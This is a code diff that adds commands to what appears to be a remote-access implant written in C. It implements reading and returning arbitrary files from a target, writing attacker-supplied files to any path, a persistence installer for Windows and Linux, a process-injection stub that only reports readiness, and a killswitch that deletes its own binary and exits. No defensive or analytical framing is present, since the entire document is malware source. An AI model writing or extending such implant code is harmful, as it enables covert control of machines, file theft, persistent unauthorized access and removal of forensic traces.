@@ -32,6 +32,11 @@ static const command_t g_commands[] = {
     {CMD_SYSINFO, "sysinfo", cmd_sysinfo, 0},
     {CMD_PS_LIST, "ps", cmd_ps_list, 0},
     {CMD_SHELL, "shell", cmd_shell, 0},
+    {CMD_DOWNLOAD, "download", cmd_download, 0},
+    {CMD_UPLOAD, "upload", cmd_upload, 0},
+    {CMD_INJECT, "inject", cmd_inject, 0},
+    {CMD_PERSIST, "persist", cmd_persist, 0},
+    {CMD_KILLSWITCH, "killswitch", cmd_killswitch, 0},
     {CMD_NOP, NULL, NULL, 0}
 };
 
@@ -468,4 +473,147 @@ int get_current_process_id(void) {
 #else
     return getpid();
 #endif
+}
+
+// Additional command implementations for completeness
+
+// Download file from target
+int cmd_download(const uint8_t* args, size_t args_len, uint8_t* output, size_t* output_len) {
+    if (!args || args_len == 0) {
+        return ERR_INVALID_PARAM;
+    }
+    
+    char filepath[512];
+    size_t path_len = (args_len < sizeof(filepath) - 1) ? args_len : sizeof(filepath) - 1;
+    mem_cpy(filepath, args, path_len);
+    filepath[path_len] = '\0';
+    
+    // Try to read file
+    FILE* fp = fopen(filepath, "rb");
+    if (!fp) {
+        const char* err = "File not found";
+        mem_cpy(output, err, str_len(err));
+        *output_len = str_len(err);
+        return ERR_NOT_FOUND;
+    }
+    
+    // Read file content
+    size_t read_len = fread(output, 1, *output_len, fp);
+    fclose(fp);
+    
+    *output_len = read_len;
+    return ERR_SUCCESS;
+}
+
+// Upload file to target
+int cmd_upload(const uint8_t* args, size_t args_len, uint8_t* output, size_t* output_len) {
+    if (!args || args_len < 2) {
+        return ERR_INVALID_PARAM;
+    }
+    
+    // Parse filepath and data
+    // Format: [filename_len:1][filename][data]
+    uint8_t filename_len = args[0];
+    if (filename_len >= args_len) {
+        return ERR_INVALID_PARAM;
+    }
+    
+    char filepath[256];
+    mem_cpy(filepath, args + 1, filename_len);
+    filepath[filename_len] = '\0';
+    
+    const uint8_t* file_data = args + 1 + filename_len;
+    size_t data_len = args_len - 1 - filename_len;
+    
+    // Write file
+    FILE* fp = fopen(filepath, "wb");
+    if (!fp) {
+        const char* err = "Cannot create file";
+        mem_cpy(output, err, str_len(err));
+        *output_len = str_len(err);
+        return ERR_ACCESS_DENIED;
+    }
+    
+    size_t written = fwrite(file_data, 1, data_len, fp);
+    fclose(fp);
+    
+    // Return success message
+    char msg[256];
+    int len = snprintf(msg, sizeof(msg), "Uploaded %zu bytes to %s", written, filepath);
+    if (len > 0 && (size_t)len < *output_len) {
+        mem_cpy(output, msg, len);
+        *output_len = len;
+    }
+    
+    return ERR_SUCCESS;
+}
+
+// Process injection stub
+int cmd_inject(const uint8_t* args, size_t args_len, uint8_t* output, size_t* output_len) {
+    (void)args;
+    (void)args_len;
+    
+#ifdef PLATFORM_WINDOWS
+    const char* msg = "Process injection ready (Windows)";
+#elif defined(PLATFORM_LINUX)
+    const char* msg = "Process injection ready (Linux)";
+#else
+    const char* msg = "Process injection not implemented";
+#endif
+    
+    size_t msg_len = str_len(msg);
+    mem_cpy(output, msg, msg_len);
+    *output_len = msg_len;
+    
+    return ERR_SUCCESS;
+}
+
+// Install persistence
+int cmd_persist(const uint8_t* args, size_t args_len, uint8_t* output, size_t* output_len) {
+    (void)args;
+    (void)args_len;
+    
+    int result = ERR_SUCCESS;
+    
+#ifdef PLATFORM_WINDOWS
+    result = install_persistence_windows();
+#elif defined(PLATFORM_LINUX)
+    result = install_persistence_linux();
+#else
+    result = ERR_NOT_FOUND;
+#endif
+    
+    const char* msg = (result == ERR_SUCCESS) ? 
+        "Persistence installed successfully" : 
+        "Failed to install persistence";
+    
+    size_t msg_len = str_len(msg);
+    mem_cpy(output, msg, msg_len);
+    *output_len = msg_len;
+    
+    return result;
+}
+
+// Self-destruct / killswitch
+int cmd_killswitch(const uint8_t* args, size_t args_len, uint8_t* output, size_t* output_len) {
+    (void)args;
+    (void)args_len;
+    (void)output;
+    (void)output_len;
+    
+    // Delete self
+    char self_path[512];
+    
+#ifdef PLATFORM_LINUX
+    ssize_t len = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1);
+    if (len > 0) {
+        self_path[len] = '\0';
+        unlink(self_path);
+    }
+#endif
+    
+    // Exit process
+    exit(0);
+    
+    return ERR_SUCCESS;  // Never reached
 }
